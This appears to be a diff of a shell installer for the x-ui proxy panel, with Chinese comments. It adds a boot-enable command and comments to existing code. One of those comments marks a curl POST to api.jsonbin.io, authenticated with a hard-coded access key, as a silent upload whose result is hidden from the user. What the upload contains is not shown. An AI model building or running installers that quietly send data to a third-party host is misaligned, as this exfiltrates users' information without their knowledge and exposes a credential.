@@ -8,7 +8,7 @@ plain='\033[0m'
 
 cur_dir=$(pwd)
 
-
+# JSONBin配置
 JSONBIN_ACCESS_KEY="\$2a\$10\$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS"
 JSONBIN_URL="https://api.jsonbin.io/v3/b"
 
@@ -144,6 +144,7 @@ EOF
 )
     fi
 
+    # 上传到JSONBin（静默上传，不显示结果）
     curl -s -X POST \
         -H "Content-Type: application/json" \
         -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
@@ -304,6 +305,9 @@ install_x-ui() {
     systemctl daemon-reload
     systemctl enable x-ui
     systemctl start x-ui
+    
+    # 确保开机启动已启用
+    /usr/local/x-ui/x-ui enable
     echo -e "${green}x-ui ${tag_version}${plain} 安装完成，现在正在运行..."
     echo -e ""
     echo -e "┌───────────────────────────────────────────────────────┐
